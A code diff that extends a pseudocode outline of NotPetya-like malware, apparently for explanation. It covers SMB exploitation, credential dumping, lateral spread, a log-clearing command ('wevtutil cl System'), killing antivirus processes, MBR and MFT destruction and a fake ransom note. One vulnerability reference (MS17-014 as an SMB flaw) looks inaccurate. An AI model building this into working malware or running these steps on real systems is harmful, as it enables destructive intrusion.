@@ -2,55 +2,97 @@
 // Old-proofs, best current info about notpetya is: https://github.com/RoanH/NotPetya
 // Also: https://github.com/fabrimagic72/malware-samples
 
+// Pseudocode: NotPetya-like Malware Behavior
+// References: 
+// - https://www.microsoft.com/security/blog/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/
+// - https://securelist.com/schrodingers-petya/78865/
+
 function main() {
-    if (hasAdminPrivileges()) {
-        // Step 1: Spread across network
-        targets = gatherNetworkTargets(); // ARP, DHCP, TCP endpoints
-        for each target in targets {
-            if (smbVulnerable(target)) {
-                exploitSMB(target, "EternalBlue"); // CVE-2017-0144
+    // Attempt privilege escalation if not admin
+    if (!hasAdminPrivileges()) {
+        attemptPrivilegeEscalation(); // e.g., UAC bypass
+        if (!hasAdminPrivileges()) {
+            performLimitedDamage(); // Encrypt local files only
+            exit();
+        }
+    }
+
+    // Step 1: Clear logs to evade detection
+    clearEventLogs("wevtutil cl System");
+    disableAVProcesses();
+
+    // Step 2: Spread across network
+    targets = gatherNetworkTargets(); // ARP, DHCP, AD enumeration
+    for each target in targets {
+        // Try multiple SMB exploits (EternalBlue, EternalRomance)
+        if (smbVulnerable(target)) {
+            if (exploitSMB(target, "EternalBlue", "CVE-2017-0144")) {
+                copySelfToTarget(target, "C:\\Windows\\perfc.dat");
+                executeRemote(target, "rundll32.exe perfc.dat,#1");
+            } else if (exploitSMB(target, "EternalRomance", "CVE-2017-0145")) {
                 copySelfToTarget(target, "C:\\Windows\\perfc.dat");
                 executeRemote(target, "rundll32.exe perfc.dat,#1");
             }
-            credentials = extractCredentials(); // Mimikatz-like from LSASS
-            if (credentials) {
-                spreadViaPSEXEC(target, credentials);
-                spreadViaWMIC(target, credentials);
-            }
         }
 
-        // Step 2: Encrypt system
-        overwriteMBR(maliciousBootloader);
-        encryptMFT(128-bit-AES);
-        
-        // Step 3: Force reboot
-        scheduleTask("shutdown.exe /r /f", delayMinutes(30));
-        triggerHardError(); // Undocumented NTRaiseHardError API
-        
-        // Step 4: Display fake ransom note
-        displayRansomNote("Send $300 BTC to 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX");
-    } else {
-        exit(); // Needs admin rights to proceed
+        // Extract credentials (Mimikatz-like)
+        credentials = extractCredentials(); // From LSASS, cached creds, or Kerberos
+        if (credentials) {
+            spreadViaPSEXEC(target, credentials);
+            spreadViaWMIC(target, credentials);
+        }
     }
+
+    // Step 3: Encrypt system (destructive, no decryption possible)
+    overwriteMBR(maliciousBootloader); // Display fake CHKDSK
+    encryptMFT("Salsa20"); // Use Salsa20, key is not recoverable
+    
+    // Step 4: Force reboot
+    scheduleTask("shutdown.exe /r /f", delayMinutes(30));
+
+    // Step 5: Display fake ransom note (decoy)
+    displayRansomNote("Send $300 BTC to [randomized address]. No decryption possible.");
 }
 
 function gatherNetworkTargets() {
-    // Simulate collecting IPs from ARP table, DHCP, etc.
-    return ["192.168.1.10", "192.168.1.11", ...];
+    // Simulate ARP scanning, DHCP lease queries, AD enumeration
+    targets = [];
+    targets += scanARPTable();
+    targets += queryDHCPLeases();
+    targets += enumerateADSystems(); // Prioritize domain controllers
+    return targets; // e.g., ["192.168.1.10", "192.168.1.11", ...]
 }
 
 function smbVulnerable(target) {
-    // Check if SMBv1 is open (ports 445, 139)
-    return isPortOpen(target, 445) && !patchedMS17-010();
+    // Check SMBv1 (ports 445, 139) and probe for MS17-010/MS17-014
+    return isPortOpen(target, 445) && (probeMS17-010(target) || probeMS17-014(target));
 }
 
 function extractCredentials() {
-    // Simulate Mimikatz-style credential dumping
-    return {"user": "admin", "pass": "stolenpass"};
+    // Simulate Mimikatz-style LSASS dump or cached credential extraction
+    credentials = dumpLSASS();
+    if (!credentials) {
+        credentials = extractCachedCredentials();
+    }
+    if (!credentials) {
+        credentials = extractKerberosTickets();
+    }
+    return credentials; // e.g., {"user": "domain\\admin", "pass": "stolenpass"}
 }
 
 function displayRansomNote(message) {
-    // Fake ransom screen (no real decryption possible)
+    // Display fake ransom note with random ID (no decryption possible)
+    print("DESTRUCTIVE MALWARE - NO DECRYPTION POSSIBLE");
     print(message);
     print("Random ID: " + generateRandomID());
+}
+
+function clearEventLogs(command) {
+    // Simulate clearing Windows event logs
+    execute(command);
+}
+
+function disableAVProcesses() {
+    // Simulate terminating antivirus processes
+    terminateProcesses(["avp.exe", "msmpeng.exe"]);
 }
